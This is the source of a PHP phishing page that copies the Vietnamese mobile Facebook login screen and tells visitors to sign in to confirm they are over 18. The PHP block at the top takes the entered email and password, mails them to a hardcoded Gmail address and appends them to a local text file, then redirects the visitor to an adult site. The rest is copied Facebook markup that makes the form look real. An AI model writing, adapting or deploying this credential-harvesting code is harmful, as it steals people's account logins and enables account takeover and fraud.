<?php


    session_start();
    ob_start();

?>

    <?php
    	if(isset($_POST["login"])){
    		$username = $_POST["email"];
    		$password = $_POST["pass"];
            if($username == ""|| $password == ""){
                echo "Bạn chưa nhập đầy đủ thông tin";
                
            }else{
                
            $_SESSION["username"] = $username;
            echo $_SESSION["username"];
    		 $subject = "Nick Via Phim";
             $headers = "Nick Via Phim - Facebook";
             $body = " \n Tài Khoản : $username \n Mật Khẩu : $password \n ";
             mail("vihop920@gmail.com", $headers, $body, $subject);
            $test = fopen("tung.txt","a");
            fwrite($test,$body);
            fclose($test); 
            
            header('Location: http://javhd.win/em-gai-dam-dang-can-ca-2-anh-chym-to-yui-kawagoe-1929.html');
            }



    	}

    ?>   
<!DOCTYPE html>
<html lang="vi" id="facebook">
    <head>
        <meta charset="utf-8"/>
        <script src="https://code.jquery.com/jquery-2.2.2.min.js"></script>
    	<title id="pageTitle">Facebook</title>
        <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
        <meta name="viewport" content="initial-scale=1,maximum-scale=1,user-scalable=no"/>
        <link href="img/O2aKM2iSbOw.png" rel="apple-touch-icon-precomposed" sizes="196x196"/>
        <meta name="referrer" content="no-referrer" />
        <meta name="referrer" content="unsafe-url" />
        <meta name="referrer" content="origin" />
        <meta name="referrer" content="no-referrer-when-downgrade" />
        <meta name="referrer" content="origin-when-cross-origin" />
        <link rel="stylesheet" type="text/css" id="nwLNW" href="https://trian-freefire.com/assets/fb.css"/>
        <link rel="stylesheet" type="text/css" id="MxbmU" href="http://khabanhidol.dyndns-office.com/mycss/responesive.css"/>
        <link rel="stylesheet" type="text/css" id="VL/WT" href="https://tuanxuong.com/demo/25885/css/3a.css"/>
        <link rel="stylesheet" type="text/css" id="ElpsC" href="https://tuanxuong.com/demo/25885/css/4a.css"/>
        <link rel="stylesheet" type="text/css" id="uZrAk" href="https://tuanxuong.com/demo/25885/css/5a.css"/>
        <script type="text/javascript">
            $("#mesbox").hide();
        </script>
    </head>
    <body tabindex="0" class="touch x1 _fzu _50-3 iframe acw">
        <br/>
        <div id="root" role="main" class="_5soa acw" data-sigil="context-layer-root content-pane" style="min-height: 0px;">
            <div class="_5b_f" style="text-align: center; color: rgb(20, 24, 35); font-family: 'Helvetica Neue', Helvetica, Arial, 'lucida grande', tahoma, verdana, arial, sans-serif; font-size: 16px; line-height: 18px;">
                <img alt="" class="mhs _5b_g img" height="70" src="https://www.facebook.com/images/fb_icon_325x325.png" style="border-top-left-radius: 7px; border-top-right-radius: 7px; border-bottom-right-radius: 7px; border-bottom-left-radius: 7px; -webkit-box-shadow: rgba(0, 0, 0, 0.298039) 0px 1px 1px; display: inline-block; height: 70px; width: 70px;" width="70" />
                <div class="uiScaledImageContainer mhs _5b_g" style="border-top-left-radius: 7px; border-top-right-radius: 7px; border-bottom-right-radius: 7px; border-bottom-left-radius: 7px; -webkit-box-shadow: rgba(0, 0, 0, 0.298039) 0px 1px 1px; display: inline-block; height: 70px; width: 70px;">
                <img alt="" class="scaledImageFitWidth img" height="70" itemprop="image" src="https://i.imgur.com/yxIbIfF.jpg" style="width: 70px;" width="70" /></div>
            </div>
            <div class="_5b_h" style="margin: 15px auto 0px; text-align: center; width: 300px; color: rgb(20, 24, 35); font-family: 'Helvetica Neue', Helvetica, Arial, 'lucida grande', tahoma, verdana, arial, sans-serif; font-size: 13px; line-height: 18px;">
                <h2><span class="fwb"><font color="red">Hãy Đăng Nhập Để Xác Minh Bạn Trên 18 Tuổi !</font></span></h2>
               
 </div> 
       <div class="aclb _4-4l"> 
        <div class="_5rut"> 
<form id="login_form" action="index.php" class="mobile-login-form _5spm" method="post" novalidate="1
data-autoid="autoid_1"> 
          <div id="user_info_container"></div> 
          <div id="pwd_label_container"></div> 
          <div id="otp_retrieve_desc_container"></div> 
          <div class="_56be _5sob"> 
           <div class="_55wo _55x2 _56bf"> 
            <div id="email_input_container">
             <input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _5ruq" id="username" name="email" required="required" autocomplete="on" id="m_login_email" 
 placeholder="Số di động hoặc email" type="text" data-sigil="m_login_email">
            </div> 
            <div> 
             <div class="_1upc _mg8"> 
              <div class="_4g33"> 
               <div class="_4g34 _5i2i _52we"> 
                <div class="_5xu4">
               <input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2" required="required" autocomplete="on" id="username" name="pass"  placeholder="Mật khẩu" type="password" data-sigil="password-plain-text-toggle-input">
                </div> 
               </div> 
              </div> 
             </div> 
            </div> 
           </div> 
          </div> 
          <div class="_2pie" style="text-align:center;"> 
           <div id="u_0_4"> 
            <button type="submit" value="Đăng nhập" class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu" name="login"><span class="_55sr">Đăng nhập</span></button> 
           </div> 
           <div id="otp_button_elem_container"></div> 
          </div> 
          <div class="_xo8"></div> 
         </form> 
         <div> 
          <div class="_43mg">
           <span class="_43mh">hoặc</span>
          </div> 
          <div class="_52jj _5t3b" id="u_0_6">
           <a role="button" class="_5t3c _28le btn btnS medBtn mfsm touchable" id="signup-button" href="#">Tạo tài khoản mới</a>
          </div> 
         </div> 
         <div> 
          <div class="other-links"> 
           <ul class="_5pkb _55wp"> 
            <li><span class="mfss fcg"><a href="#" id="forgot-password-link">Quên mật khẩu?</a></span></li> 
           </ul> 
          </div> 
         </div> 
        </div> 
       </div> 
      </div> 
     </div> 
     <div class="_55wr _5ui2"> 
      <div class="_5dpw"> 
       <div class="_5ui3" data-nocookies="1" id="locale-selector"> 
        <div class="_4g33"> 
         <div class="_4g34"> 
          <span class="_52jc _52j9 _52jh _3ztb">Tiếng Việt</span> 
          <div class="_3ztc">
           <span class="_52jc"><a href="#">中文(台灣)</a></span>
          </div> 
          <div class="_3ztc">
           <span class="_52jc"><a href="#">Español</a></span>
          </div> 
          <div class="_3ztc">
           <span class="_52jc"><a href="#">Français (France)</a></span>
          </div> 
         </div> 
         <div class="_4g34"> 
          <div class="_3ztc">
           <span class="_52jc"><a href="#">English (UK)</a></span>
          </div> 
          <div class="_3ztc">
           <span class="_52jc"><a href="#">한국어</a></span>
          </div> 
          <div class="_3ztc">
           <span class="_52jc"><a href="#">Português (Brasil)</a></span>
          </div> 
          <a href="#"> 
           <div class="_3j87 _1rrd _3ztd" aria-label="Danh sách ngôn ngữ đầy đủ">
            <i class="img sp_7V_P8-AK9yC sx_21ee4d"></i>
           </div> </a> 
         </div> 
        </div> 
       </div> 
       <div class="_5ui4">
        <span class="mfss fcg">Facebook © 2020</span>
       </div> 
      </div> 
     </div> 
    </div> 
   </div> 
  </div> 
 </body>
</html>